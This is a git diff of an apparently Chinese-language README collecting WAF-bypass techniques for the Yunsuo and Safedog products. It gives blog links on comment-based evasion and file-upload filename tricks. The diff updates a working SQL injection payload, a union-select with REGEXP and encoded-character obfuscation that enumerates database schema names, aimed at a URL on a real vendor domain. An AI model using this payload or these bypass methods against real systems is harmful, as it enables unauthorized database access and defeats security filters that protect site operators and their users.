@@ -25,11 +25,11 @@ safedog_upload_huanhang.txt<br>
 blog:https://pureqh.top/?p=1882<br>
 ~~云锁：引号包裹注释符绕过检测~~<br>
 ~~blog:https://pureqh.top/?p=4175~~<br>
-云锁：注释符嵌入特殊字符绕过检测<br>
+云锁：多行注释符嵌入#绕过检测<br>
 blog:https://pureqh.top/?p=4414<br>
 文件上传：Content-Disposition参数溢出、文件名换行绕过<br>
 blog:https://pureqh.top/?p=1225<br>
 
 ## 注：bypass云锁  
-http://help.yunsuo.com.cn/guide/install/?id=1 /*#&*/ union select 1,group_concat(schema_name),2,3 from information_schema.schemata --  
+http://help.yunsuo.com.cn/guide/install/?id=1' REGEXP "[...%26 %23*]" union select 1,group_concat(schema_name),3 from information_schema.schemata  
 
